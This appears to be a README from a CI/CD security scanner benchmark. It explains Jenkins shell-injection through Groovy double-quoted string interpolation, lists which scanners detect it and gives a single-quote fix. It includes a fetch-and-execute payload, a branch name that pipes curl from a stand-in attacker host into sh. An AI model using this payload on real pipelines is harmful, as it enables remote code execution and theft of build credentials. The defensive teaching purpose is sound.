# Scenario 40: Jenkins — `sh` string-interpolation injection

**Provider:** Jenkins (declarative pipeline)

**OWASP CICD-SEC mapping:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable pipeline:** [`Jenkinsfile`](Jenkinsfile)

## The pattern

In a Jenkins `Jenkinsfile`, a **double-quoted** Groovy string (a *GString*)
performs `${...}` interpolation **in Groovy, before the shell runs**. So:

```groovy
sh "echo Building branch ${env.BRANCH_NAME}"
```

is assembled by Groovy into a command string with `BRANCH_NAME` already
substituted, and *then* handed to `/bin/sh`. If the interpolated value is
attacker-controlled — a branch name, a PR title, a build parameter — the
attacker controls shell **syntax**. Jenkins' own documentation calls this
"analogous to SQL injection." It is the Jenkins analogue of the GitHub
Actions expression-injection family (scenarios
[02](../02-script-injection-issue-title/README.md) /
[31](../31-script-injection-head-ref/README.md)).

## How an attacker exploits it

Open a pull request from a branch named:

```
$(curl https://attacker.tld | sh)
```

When the multibranch job builds it, Groovy expands the GString to:

```bash
echo Building branch $(curl https://attacker.tld | sh)
```

and the agent runs the attacker's command with the job's credentials in
scope. The same applies to the `params.DEPLOY_TARGET` line for anyone who can
trigger a parameterised build.

## Expected scanner coverage

Only scanners that parse `Jenkinsfile` apply here; every other scanner in the
comparison (including GHA-only and the GitLab/IaC-only ones) renders `—`.

| Scanner | Detection |
|---------|-----------|
| pipeline-check | Jenkins shell-interpolation rule (`JF-*`) |
| ciguard | Jenkins declarative shell-injection rule |

> **Caveat — this class wants Groovy AST.** Distinguishing a dangerous
> double-quoted interpolation of an *untrusted* value from a benign one
> (and `"` vs `'`) is hard for a YAML/regex matcher. Treat a static
> scanner's verdict here as a coarse signal; full confidence needs Groovy
> AST / data-flow analysis. Fired rule IDs are reconciled against real
> SARIF (`tools/regen-readme.py --verify`).

## Fix

Use a **single-quoted** Groovy string so Groovy does *not* interpolate, and
let the shell expand the variable from its own environment (where it is a
literal value, not re-parsed syntax):

```groovy
// value reaches the shell via the environment, quoted, never spliced
withEnv(["BRANCH=${env.BRANCH_NAME}"]) {
    sh 'echo "Building branch $BRANCH"'
}
```

Never build a `sh`/`bat`/`powershell` argument out of a double-quoted GString
that contains untrusted input.

## References

- Jenkins Docs — Using a Jenkinsfile (security hardening / string interpolation):
  https://www.jenkins.io/doc/book/pipeline/jenkinsfile/
- CloudBees — String interpolation:
  https://docs.cloudbees.com/docs/cloudbees-ci/latest/automating-with-jenkinsfile/string-interpolation
